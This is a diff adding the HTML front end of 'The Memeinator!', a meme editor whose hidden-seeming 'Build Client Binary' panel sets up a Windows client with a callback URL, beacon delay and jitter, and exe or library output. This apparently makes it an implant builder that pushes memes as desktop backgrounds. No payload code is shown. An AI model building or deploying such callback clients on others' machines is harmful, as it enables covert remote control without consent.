@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>The Memeinator!</title>
+
+    <link rel="stylesheet" href="/lib/app.css">
+
+    <script type="text/javascript" src="/lib/fabric.6.5.4.min.js"></script>
+    <script type="text/javascript" src="/lib/imagesloaded.5.0.0.min.js"></script>
+    <script type="text/javascript" src="/lib/masonry.4.2.2.min.js"></script>
+
+</head>
+
+<body>
+
+    <div class="toolbar">
+        <div>
+            <input type="file" id="upload-image" accept="image/*"></input>
+        </div>
+
+        <div>
+            <input type="color" id="shape-color" value="#000000"></input>
+            <input type="button" id="add-shape" value="Add Square"></input>
+        </div>
+
+        <div>
+            <input type="range" id="font-size" value="24" min="8" max="100"
+                oninput="this.nextElementSibling.value = this.value"></input>
+            <output id="font-size">24</output>
+            <input type="color" id="font-color" value="#000000"></input>
+            <input type="button" id="add-text" value="Add Text"></input>
+        </div>
+
+        <div>
+            <input type="color" id="background-color" value="#000000"></input>
+            <select id="resolution" name="resolution">
+                <option value="1024,768">1024x768 (XGA)</option>
+                <option value="1280,720" selected>1280x720 (HD Ready)</option>
+                <option value="1280,1024">1280x1024 (SXGA)</option>
+                <option value="1366,768">1366x768 (HD)</option>
+                <option value="1440,900">1440x900 (WXGA+)</option>
+                <option value="1920,1080">1920x1080 (Full HD)</option>
+                <option value="2560,1440">2560x1440 (QHD)</option>
+                <option value="3840,2160">3840x2160 (4K)</option>
+                <option value="5120,2880">5120x2880 (5K)</option>
+                <option value="7680,4320">7680x4320 (8K)</option>
+            </select>
+        </div>
+
+        <div>
+            <label for="scale-to-fit">Auto Scale</label>
+            <input type="checkbox" id="scale-to-fit" checked></input>
+        </div>
+
+        <div>
+            <input type="button" id="ocd-center-me-please" value="Center"></input>
+            <input type="button" id="download" value="Download"></input>
+            <input type="button" id="sendit" value="Send it!"></input>
+        </div>
+
+        <div>
+            <input type="button" id="open-btn" value="Status"></input>
+            <input type="button" id="open-btn-top" value="Build Client"></input>
+        </div>
+
+    </div>
+
+    <div id="drawer" class="drawer">
+        <h2>Wall of Memeinatored</h2>
+        <div id="results-container"></div>
+        <p>Updated every 5 seconds ^_^</p>
+        <input type="button" id="close-btn" class="close-btn" value="Close"></input>
+    </div>
+
+    <div id="drawer-top" class="drawer-top">
+        <h2>Build Client Binary</h2>
+        <div id="buildit-form">
+            <label for="client-callback-url">URL</label>
+            <input type="url" id="client-callback-url" value="callback.tld"></input>
+
+            <label for="host-background-path">Host Background Path</label>
+            <input type="text" id="host-background-path" value="C:/windows/temp/background.png"></input>
+
+        </br>
+
+            <label for="client-callback-delay">Delay (seconds)</label>
+            <input type="range" id="client-callback-delay" value="60" min="30" max="10800" step="15"
+            oninput="this.nextElementSibling.value = this.value"></input>
+            <output id="client-callback-delay"></output>
+
+        </br>
+
+            <label for="client-callback-jitter">Jitter (seconds)</label>
+            <input type="range" id="client-callback-jitter" value="120" min="30" max="3600" step="15"
+            oninput="this.nextElementSibling.value = this.value"></input>
+            <output id="client-callback-jitter"></output>
+            
+        </br>
+
+            <select id="client-flavor" name="client-flavor">
+                <option value="exe">exe</option>
+                <option value="library">library</option>
+            </select>
+
+        </div>
+        <input type="button" id="buildit" value="Build it!" style="margin-top:30px;"></input>
+        <input type="button" id="close-btn-top" class="close-btn" value="Close"></input>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <div class="grid">
+        <div class="grid-sizer"></div>
+    </div>
+
+
+    <script src="/lib/app.js"></script>
+
+</body>
+
+</html>
